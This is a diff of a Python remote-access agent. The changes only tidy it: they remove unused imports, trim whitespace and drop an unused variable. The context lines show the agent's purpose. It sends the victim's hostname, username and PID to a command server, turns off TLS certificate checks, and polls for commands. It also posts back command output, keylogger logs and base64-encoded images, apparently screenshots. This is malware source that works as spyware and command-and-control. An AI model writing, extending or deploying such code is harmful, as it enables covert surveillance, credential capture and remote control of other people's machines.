@@ -2,14 +2,9 @@ import os
 import sys
 import base64
 import http.client
-import json
 import getpass
 import ssl
-import time
-import subprocess
-from pathlib import Path
 import socket
-import random
 
 from localAgent import LocalAgent
 
@@ -22,15 +17,15 @@ class HTTPSAgent(LocalAgent):
 		self.headers = {'Content-type': 'text/plain', 'UID': self.daemonUID, 'Hostname': socket.gethostname(), 'PID': os.getpid(), 'Username': getpass.getuser(), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1'}
 
 	def getScriptName(self):
-		return os.path.realpath(__file__) 
+		return os.path.realpath(__file__)
         
 	def postHTTPS(self, headers, resource, cmd_output):
-		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
+		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
 		ssl_context.check_hostname = False
 		ssl_context.verify_mode = ssl.CERT_NONE
 		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
 		connection.request('POST', resource, cmd_output + os.linesep, headers)
-		response = connection.getresponse().read().decode()
+		connection.getresponse().read().decode()
    
 	def postKeylogger(self, log):
 		try:
@@ -61,7 +56,7 @@ class HTTPSAgent(LocalAgent):
 			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
             
 	def pollServer(self):
-		try:    
+		try:
 			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
@@ -142,7 +137,6 @@ class HTTPSAgent(LocalAgent):
 			connection.request('POST', "/proxy", im_b64, localheaders)
 		except Exception as e:
 			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)
-
 
 agent = HTTPSAgent()
 agent.run()
